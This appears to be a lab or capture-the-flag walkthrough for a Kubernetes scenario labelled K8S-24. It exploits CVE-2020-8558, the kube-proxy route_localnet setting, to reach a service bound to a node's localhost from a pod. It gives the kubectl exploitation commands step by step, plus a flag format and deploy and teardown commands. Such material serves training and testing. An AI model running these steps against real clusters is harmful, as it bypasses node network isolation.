# K8S-24: kube-proxy Localhost Boundary Bypass

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-24 |
| 名称 | kube-proxy Localhost Boundary Bypass |
| 技术/CVE | CVE-2020-8558 |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-24-localhost-bypass |
| 攻击面 | route_localnet=1 → reach node 127.0.0.1 from pod |

## 场景概述

```
Pod discovers node IP → kube-proxy sets route_localnet=1
  → Packets to 127.0.0.1 get routed to node's localhost
  → Access service bound to node's 127.0.0.1:11080
```

## 前置知识

- kubectl access to KIND cluster `cve-k8s-24-localhost-bypass`
- 节点上 kube-proxy 打开 `route_localnet=1`，可从 pod 访问节点 `127.0.0.1` 上的服务

## 利用步骤

### Step 1: Discover Node IP

```bash
kubectl exec attacker -- cat /etc/hosts
# OR
kubectl exec attacker -- nslookup kubernetes.default.svc.cluster.local
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
```

### Step 2: Verify route_localnet

```bash
# From a privileged pod on the node:
kubectl exec attacker -- cat /proc/sys/net/ipv4/conf/all/route_localnet 2>/dev/null || echo "check via host"
# Expected: 1 (enabled by kube-proxy)
```

### Step 3: Access Localhost-Bound Service

```bash
# The service is bound to 127.0.0.1:11080 on the node
# With route_localnet=1, we can reach it via the node's external IP
kubectl exec attacker -- wget -qO- http://${NODE_IP}:11080/flag
# Output: flag{k8s-24-<16-hex>}
```

## 验证命令

```bash
cd cve_challenges/scenarios/k8s/localhost-bypass && bash deploy.sh
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
kubectl exec attacker -- wget -qO- http://${NODE_IP}:11080/flag
bash teardown.sh
```

## Flag

- **Primary**: Served by localhost-service at `http://<NODE_IP>:11080/flag`
- **Format**: `flag{k8s-24-<16-hex>}`

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | kube-proxy localhost listeners and pod networking |
| 侦察与前置条件 | Node-local API binding and routing bypass conditions |
| 核心漏洞与利用 | Reach a localhost-only kube-proxy/API endpoint from a pod |
| 权限、横向或影响 | Node boundary bypass |
| 验证 | Query the local service for the flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
